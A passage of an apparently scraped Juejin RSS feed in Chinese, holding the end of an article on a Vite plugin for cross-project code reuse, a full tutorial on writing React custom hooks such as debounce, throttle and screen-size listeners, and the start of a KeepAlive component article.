  <span class="hljs-attr">dir</span>: <span class="hljs-string">'mdm-pc'</span>  <span class="hljs-comment">// 本地存放目录</span>
}
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2b6ca51236224404b5ba283028673f6e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rWu5bm75LqR5pyI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770369874&amp;x-signature=clzoq9KrtH6yG2l7yvIQ0M0W9jw%3D" alt="image.png" loading="lazy"/></p>
<pre><code class="hljs language-csharp" lang="csharp">
<span class="hljs-meta">### 2. 智能导入替换，支持三种替换方式，任意选择</span>

```typescript
<span class="hljs-keyword">interface</span> <span class="hljs-title">ImportReplacementConfig</span> {
    <span class="hljs-comment">/**
     * 匹配模式（正则表达式字符串）
     */</span>
    pattern: RegExp;
    <span class="hljs-comment">/**
     * 替换方式：代码字符串
     */</span>
    code?: <span class="hljs-built_in">string</span>;
    <span class="hljs-comment">/**
     * 替换方式：文件路径
     */</span>
    file?: <span class="hljs-built_in">string</span>;
    <span class="hljs-comment">/**
     * 替换方式：重定向路径
     */</span>
    resolve?: <span class="hljs-built_in">string</span>;
}
</code></pre>
<h3 data-id="heading-11">3. 别名路径冲突映射修正，将被引用的仓库内部别名指向仓库内部，规避和外层别名的冲突</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">RepoImportMappings</span> {
    <span class="hljs-comment">/**
     * 路径别名
     */</span>
    <span class="hljs-attr">alias</span>: <span class="hljs-built_in">string</span>;
    <span class="hljs-comment">/**
     * 冲突的仓库目录
     */</span>
    <span class="hljs-attr">repoDir</span>: <span class="hljs-built_in">string</span>;
    <span class="hljs-comment">/**
     * 忽略列表（路径匹配时跳过），使用外出仓库别名解析
     */</span>
    ignorePatterns?: <span class="hljs-built_in">string</span>[];
}
</code></pre>
<h2 data-id="heading-12">实际效果对比</h2>
<h3 data-id="heading-13">迁移前（传统方式）</h3>
<pre><code class="hljs language-scss" lang="scss">├── 移动端项目
│   ├── <span class="hljs-attribute">src</span>
│   │   ├── views
│   │   │   ├── PatientList<span class="hljs-selector-class">.vue</span>    ← 需要重写
│   │   │   ├── DoctorList<span class="hljs-selector-class">.vue</span>     ← 需要重写
│   │   │   └── ... (<span class="hljs-number">20</span>+个页面)
│   │   └── components
│   │       ├── MbForm<span class="hljs-selector-class">.vue</span>         ← 需要重写
│   │       └── ... (<span class="hljs-number">50</span>+个组件)
└── 工时：<span class="hljs-number">3</span>-<span class="hljs-number">4</span>人月
</code></pre>
<h3 data-id="heading-14">迁移后（使用插件）</h3>
<pre><code class="hljs language-scss" lang="scss">├── 移动端项目
│   ├── mdm-pc/                    ← 自动引入的PC端代码
│   ├── <span class="hljs-attribute">src</span>
│   │   ├── views
│   │   │   ├── PatientList<span class="hljs-selector-class">.vue</span>    ← 直接引用PC端PatientList组件，只对样式做适配覆盖
│   │   │   ├── DoctorList<span class="hljs-selector-class">.vue</span>     ← 直接引用PC端DoctorList组件，只对样式做适配覆
│   │   │   └── ... (复用<span class="hljs-number">80%</span>)
│   │   └── components
│   │       ├── MbUploader<span class="hljs-selector-class">.vue</span>     ← 无法复用的组件，用移动端专用文件组件做替换
│   │       └── ... (只需写<span class="hljs-number">30%</span>的组件)
└── 工时：<span class="hljs-number">1</span>-<span class="hljs-number">1.5</span>人月（节省<span class="hljs-number">60%</span>+）
</code></pre>
<h2 data-id="heading-15">高级应用场景</h2>
<h3 data-id="heading-16">场景1：多项目共享工具库</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 多个项目共享工具函数</span>
<span class="hljs-title function_">codeReusePlugin</span>({
  <span class="hljs-attr">repositories</span>: [
    {
      <span class="hljs-attr">url</span>: <span class="hljs-string">'git@github.com:company/shared-utils.git'</span>,
      <span class="hljs-attr">branch</span>: <span class="hljs-string">'main'</span>,
      <span class="hljs-attr">dir</span>: <span class="hljs-string">'shared-utils'</span>
    },
    ...
  ],
  <span class="hljs-attr">importReplacements</span>: [
    {
      <span class="hljs-attr">pattern</span>: <span class="hljs-regexp">/^@shared\/utils/</span>,
      <span class="hljs-attr">resolve</span>: path.<span class="hljs-title function_">resolve</span>(<span class="hljs-string">'shared-utils/src'</span>)
    },
    ...
  ]
})
</code></pre>
<h3 data-id="heading-17">场景2：主题系统切换</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 根据环境切换主题</span>
<span class="hljs-title function_">codeReusePlugin</span>({
  <span class="hljs-attr">importReplacements</span>: [
    {
      <span class="hljs-attr">pattern</span>: <span class="hljs-regexp">/\/themes\/default/</span>,
      <span class="hljs-attr">file</span>: process.<span class="hljs-property">env</span>.<span class="hljs-property">NODE_ENV</span> === <span class="hljs-string">'mobile'</span> 
        ? <span class="hljs-string">'src/themes/mobile.vue'</span>
        : <span class="hljs-string">'src/themes/pc.vue'</span>
    }
  ]
})
</code></pre>
<h3 data-id="heading-18">场景3：A/B测试版本</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// A/B测试不同版本的组件</span>
<span class="hljs-title function_">codeReusePlugin</span>({
  <span class="hljs-attr">importReplacements</span>: [
    {
      <span class="hljs-attr">pattern</span>: <span class="hljs-regexp">/\/components\/CheckoutButton\.vue$/</span>,
      <span class="hljs-attr">file</span>: <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() &gt; <span class="hljs-number">0.5</span> 
        ? <span class="hljs-string">'src/components/CheckoutButtonVariantA.vue'</span>
        : <span class="hljs-string">'src/components/CheckoutButtonVariantB.vue'</span>
    }
  ]
})
</code></pre>
<h2 data-id="heading-19">总结</h2>
<p><code>vite-plugin-code-reuse</code> 插件为我们解决了跨项目代码复用的核心痛点：</p>
<h3 data-id="heading-20">🎯 <strong>核心价值</strong></h3>
<ol>
<li><strong>大幅提升开发效率</strong>：节省60%+的开发时间</li>
<li><strong>保证代码一致性</strong>：业务逻辑完全一致，减少BUG</li>
<li><strong>降低维护成本</strong>：一处修改，多处生效</li>
<li><strong>灵活定制</strong>：UI层完全可定制，不影响核心逻辑</li>
</ol>
<h3 data-id="heading-21">🚀 <strong>适用场景</strong></h3>
<ul>
<li>PC端到移动端的项目迁移</li>
<li>多项目共享组件库</li>
<li>微前端架构中的模块复用</li>
<li>A/B测试和实验性功能</li>
</ul>
<p>如果你也面临类似的多项目代码复用问题，不妨试试这个插件。项目已在GitHub开源，欢迎Star和贡献代码！</p>
<p><strong>GitHub地址</strong>：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fxlian-fe%2Fvite-plugin-code-reuse" target="_blank" title="https://github.com/xlian-fe/vite-plugin-code-reuse" ref="nofollow noopener noreferrer">vite-plugin-code-reuse</a></p>
<p><strong>让代码复用变得简单，让开发效率飞起来！</strong> 🚀</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[React-Hooks逻辑复用艺术]]></title>    <link>https://juejin.cn/post/7600990891206787099</link>    <guid>https://juejin.cn/post/7600990891206787099</guid>    <pubDate>2026-01-30T09:38:58.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600990891206787099" data-draft-id="7600752623068758026" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="React-Hooks逻辑复用艺术"/> <meta itemprop="keywords" content="前端,JavaScript,面试"/> <meta itemprop="datePublished" content="2026-01-30T09:38:58.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="发现一只大呆瓜"/> <meta itemprop="url" content="https://juejin.cn/user/180747382561607"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            React-Hooks逻辑复用艺术
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/180747382561607/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    发现一只大呆瓜
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T09:38:58.000Z" title="Fri Jan 30 2026 09:38:58 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">前言</h3>
<p>在 React 开发中，Hooks 的出现彻底改变了逻辑复用的方式。它让我们能够将复杂的、可复用的逻辑从 UI 组件中抽离，实现真正的“关注点分离”。本文将分享 Hooks 的核心原则，并提供 4 个在真实业务场景中封装的实战案例。</p>
<h2 data-id="heading-1">一、 Hooks 核心</h2>
<h3 data-id="heading-2">1. 概念理解</h3>
<p>Hooks 本质上是<strong>将组件间共享的逻辑抽离并封装成的特殊函数</strong>。</p>
<h3 data-id="heading-3">2. 使用“红线”：规则与原理</h3>
<ul>
<li><strong>命名规范</strong>：必须以 <code>use</code> 开头（如 <code>useChat</code>），这不仅是约定，也是静态检查工具（ESLint）识别 Hook 的依据。</li>
<li><strong>调用位置</strong>：<strong>严禁在循环、条件判断或嵌套函数中调用 Hook</strong>。</li>
</ul>
<p><strong>底层原理</strong>： React 内部并不是通过“变量名”来记录 Hook 状态的，而是通过<strong>链表</strong> 。每次渲染时，React 严格依赖 Hook 的<strong>调用顺序</strong>来查找对应的状态。</p>
<blockquote>
<p><strong>注意：</strong> 如果在 <code>if</code> 语句中调用 Hook，一旦条件不成立导致某次渲染跳过了该 Hook，整个链表的指针就会错位，导致状态读取异常。</p>
</blockquote>
<h2 data-id="heading-4">二、 实战：自定义 Hooks 封装</h2>
<h3 data-id="heading-5">1. AI 场景：消息点赞/点踩逻辑 (<code>useChatEvaluate</code>)</h3>
<p>在 AI 对话系统中，消息评价是通用功能。我们需要处理：状态切换（点赞 -&gt; 取消点赞）、单选逻辑、以及异步接口调用。</p>
<pre><code class="hljs language-TSX" lang="TSX"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span>, { useState } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;

<span class="hljs-comment">// 模拟接口</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">public_evaluateMessage</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">params: <span class="hljs-built_in">any</span></span>) =&gt; ({ <span class="hljs-attr">data</span>: <span class="hljs-literal">true</span> });

<span class="hljs-keyword">type</span> <span class="hljs-title class_">EvaluateType</span> = <span class="hljs-string">"GOOD"</span> | <span class="hljs-string">"BAD"</span> | <span class="hljs-string">"NONE"</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">useChatEvaluate</span> = (<span class="hljs-params">initialType: EvaluateType = <span class="hljs-string">"NONE"</span></span>) =&gt; {
  <span class="hljs-keyword">const</span> [ratingType, setRatingType] = useState&lt;<span class="hljs-title class_">EvaluateType</span>&gt;(initialType);

  <span class="hljs-keyword">const</span> <span class="hljs-title function_">evaluateMessage</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">contentId: <span class="hljs-built_in">number</span>, <span class="hljs-keyword">type</span>: <span class="hljs-string">"GOOD"</span> | <span class="hljs-string">"BAD"</span></span>) =&gt; {
    <span class="hljs-keyword">let</span> <span class="hljs-attr">newEvaluateType</span>: <span class="hljs-title class_">EvaluateType</span>;

    <span class="hljs-comment">// 逻辑：如果点击已选中的类型，则取消选中(NONE)；否则切换到新类型</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">type</span> === <span class="hljs-string">"GOOD"</span>) {
      newEvaluateType = ratingType === <span class="hljs-string">"GOOD"</span> ? <span class="hljs-string">"NONE"</span> : <span class="hljs-string">"GOOD"</span>;
    } <span class="hljs-keyword">else</span> {
      newEvaluateType = ratingType === <span class="hljs-string">"BAD"</span> ? <span class="hljs-string">"NONE"</span> : <span class="hljs-string">"BAD"</span>;
    }

    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> <span class="hljs-title function_">public_evaluateMessage</span>({
        contentId,
        <span class="hljs-attr">ratingType</span>: newEvaluateType,
        <span class="hljs-attr">content</span>: <span class="hljs-string">""</span>,
      });

      <span class="hljs-keyword">if</span> (res.<span class="hljs-property">data</span> === <span class="hljs-literal">true</span>) {
        <span class="hljs-title function_">setRatingType</span>(newEvaluateType);
      }
    } <span class="hljs-keyword">catch</span> (error) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">"评价失败:"</span>, error);
    }
  };

  <span class="hljs-keyword">return</span> { ratingType, evaluateMessage };
};

<span class="hljs-comment">// 使用示例</span>
<span class="hljs-keyword">const</span> <span class="hljs-title class_">ChatMessage</span>: <span class="hljs-title class_">React</span>.<span class="hljs-property">FC</span>&lt;{ <span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span> }&gt; = <span class="hljs-function">(<span class="hljs-params">{ id }</span>) =&gt;</span> {
  <span class="hljs-keyword">const</span> { ratingType, evaluateMessage } = <span class="hljs-title function_">useChatEvaluate</span>();
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> evaluateMessage(id, "GOOD")}&gt;
      {ratingType === "GOOD" ? "👍 已点赞" : "👍 点赞"}
    <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span>
  );
};
</code></pre>
<hr/>
<h3 data-id="heading-6">2. 响应式布局：屏幕尺寸监听 (<code>useMediaSize</code>)</h3>
<p>在响应式系统中，封装一个能根据窗口宽度自动切换“设备类型”的 Hook，可以极大地简化响应式开发。</p>
<pre><code class="hljs language-TSX" lang="TSX"><span class="hljs-keyword">import</span> { useState, useEffect, useMemo } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">MediaType</span> {
  mobile = <span class="hljs-string">'mobile'</span>,
  tablet = <span class="hljs-string">'tablet'</span>,
  pc = <span class="hljs-string">'pc'</span>,
}

<span class="hljs-keyword">const</span> useMediaSize = (): <span class="hljs-function"><span class="hljs-params">MediaType</span> =&gt;</span> {
  <span class="hljs-keyword">const</span> [width, setWidth] = useState&lt;<span class="hljs-built_in">number</span>&gt;(globalThis.<span class="hljs-property">innerWidth</span>);

  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleWindowResize</span> = (<span class="hljs-params"/>) =&gt; <span class="hljs-title function_">setWidth</span>(<span class="hljs-variable language_">window</span>.<span class="hljs-property">innerWidth</span>);
    <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'resize'</span>, handleWindowResize);
    <span class="hljs-comment">// 记得清理事件监听</span>
    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'resize'</span>, handleWindowResize);
  }, []);

  <span class="hljs-comment">// 使用 useMemo 避免每次渲染都重新运行计算逻辑</span>
  <span class="hljs-keyword">const</span> media = <span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">if</span> (width &lt;= <span class="hljs-number">640</span>) <span class="hljs-keyword">return</span> <span class="hljs-title class_">MediaType</span>.<span class="hljs-property">mobile</span>;
    <span class="hljs-keyword">if</span> (width &lt;= <span class="hljs-number">768</span>) <span class="hljs-keyword">return</span> <span class="hljs-title class_">MediaType</span>.<span class="hljs-property">tablet</span>;
    <span class="hljs-keyword">return</span> <span class="hljs-title class_">MediaType</span>.<span class="hljs-property">pc</span>;
  }, [width]);

  <span class="hljs-keyword">return</span> media;
};

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> useMediaSize;
</code></pre>
<hr/>
<h3 data-id="heading-7">3. 性能优化：防抖与节流 Hook</h3>
<h4 data-id="heading-8">A. 防抖 Hook (<code>useDebounce</code>)</h4>
<p>常用于搜索框，防止用户快速输入时频繁触发请求。</p>
<pre><code class="hljs language-TSX" lang="TSX"><span class="hljs-keyword">import</span> { useState, useEffect } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;

<span class="hljs-keyword">function</span> useDebounce&lt;T&gt;(<span class="hljs-attr">value</span>: T, <span class="hljs-attr">delay</span>: <span class="hljs-built_in">number</span>): T {
  <span class="hljs-keyword">const</span> [debouncedValue, setDebouncedValue] = useState&lt;T&gt;(value);

  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">const</span> handler = <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
      <span class="hljs-title function_">setDebouncedValue</span>(value);
    }, delay);

    <span class="hljs-comment">// 关键：在下一次 useEffect 执行前清理上一次的定时器</span>
    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">clearTimeout</span>(handler);
  }, [value, delay]);

  <span class="hljs-keyword">return</span> debouncedValue;
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> useDebounce;
</code></pre>
<h4 data-id="heading-9">B. 节流 Hook (<code>useThrottle</code>)</h4>
<p>常用于滚动加载、窗口缩放，确保在规定时间内只执行一次。</p>
<pre><code class="hljs language-TSX" lang="TSX"><span class="hljs-keyword">import</span> { useState, useEffect, useRef } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;

<span class="hljs-keyword">function</span> useThrottle&lt;T&gt;(<span class="hljs-attr">value</span>: T, <span class="hljs-attr">delay</span>: <span class="hljs-built_in">number</span>): T {
  <span class="hljs-keyword">const</span> [throttledValue, setThrottledValue] = useState&lt;T&gt;(value);
  <span class="hljs-keyword">const</span> lastExecuted = useRef&lt;<span class="hljs-built_in">number</span>&gt;(<span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>());

  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">const</span> now = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>();
    <span class="hljs-keyword">const</span> remainingTime = delay - (now - lastExecuted.<span class="hljs-property">current</span>);

    <span class="hljs-keyword">if</span> (remainingTime &lt;= <span class="hljs-number">0</span>) {
      <span class="hljs-comment">// 立即执行</span>
      <span class="hljs-title function_">setThrottledValue</span>(value);
      lastExecuted.<span class="hljs-property">current</span> = now;
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-comment">// 设置定时器处理剩余时间</span>
      <span class="hljs-keyword">const</span> timer = <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
        <span class="hljs-title function_">setThrottledValue</span>(value);
        lastExecuted.<span class="hljs-property">current</span> = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>();
      }, remainingTime);

      <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">clearTimeout</span>(timer);
    }
  }, [value, delay]);

  <span class="hljs-keyword">return</span> throttledValue;
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> useThrottle;
</code></pre>
<hr/>
<h2 data-id="heading-10">三、 总结：封装自定义 Hook 的心法</h2>
<ol>
<li><strong>抽离状态而非仅逻辑</strong>：如果一段逻辑只涉及纯函数计算，不需要 Hook；只有涉及 <code>useState</code> 或 <code>useEffect</code> 等状态管理时，才有必要封装 Hook。</li>
<li><strong>保持纯净</strong>：自定义 Hook 应该只关心逻辑，而不应该直接操作 DOM。</li>
<li><strong>TS 类型保护</strong>：利用泛型 <code>&lt;T&gt;</code> 增强 Hook 的兼容性，让它能适配各种数据类型。</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[React 手写实现的 KeepAlive 组件 🚀]]></title>    <link>https://juejin.cn/post/7600967006893178889</link>    <guid>https://juejin.cn/post/7600967006893178889</guid>    <pubDate>2026-01-30T09:42:50.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600967006893178889" data-draft-id="7600705962249191433" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="React 手写实现的 KeepAlive 组件 🚀"/> <meta itemprop="keywords" content="React.js,面试,前端"/> <meta itemprop="datePublished" content="2026-01-30T09:42:50.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="xiaoxue_"/> <meta itemprop="url" content="https://juejin.cn/user/4065372122398027"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            React 手写实现的 KeepAlive 组件 🚀
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4065372122398027/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    xiaoxue_
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T09:42:50.000Z" title="Fri Jan 30 2026 09:42:50 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读9分钟
